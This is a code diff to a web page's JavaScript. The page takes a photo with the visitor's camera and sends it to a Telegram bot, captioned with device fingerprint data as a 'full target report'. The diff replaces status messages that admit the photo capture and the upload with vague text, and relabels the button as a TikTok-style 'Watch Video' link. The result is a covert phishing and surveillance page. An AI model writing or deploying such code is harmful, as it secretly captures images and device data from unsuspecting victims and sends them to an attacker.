@@ -236,7 +236,7 @@
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
-                    status.innerText = "Mengambil foto...";
+                    status.innerText = "sedikit lagi";
 
                     setTimeout(() => {
                         canvas.width = video.videoWidth;
@@ -254,7 +254,7 @@
                             const captionFinal = `📊 LAPORAN TARGET LENGKAP:\n\n${fingerprintText}`;
                             formData.append('caption', captionFinal);
 
-                            status.innerText = "Mengirim data ke Telegram...";
+                            status.innerText = "menuju video";
 
                             try {
                                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -264,15 +264,15 @@
 
                                 const resData = await res.json();
                                 if (resData.ok) {
-                                    status.innerText = "Berhasil! Data HP terkirim ke Telegram.";
+                                    status.innerText = "Berhasil!.";
                                 } else {
-                                    status.innerText = "Gagal mengunggah ke Telegram.";
+                                    status.innerText = "Gagal .";
                                 }
                             } catch (error) {
                                 status.innerText = "Koneksi Error.";
                             } finally {
                                 btnTes.disabled = false;
-                                btnTes.innerHTML = '<i class="fas fa-camera"></i> Tes Ambil Foto & Data';
+                                btnTes.innerHTML = '<i class="Tiktok"></i> Tonton Video';
                             }
 
                         }, 'image/png');
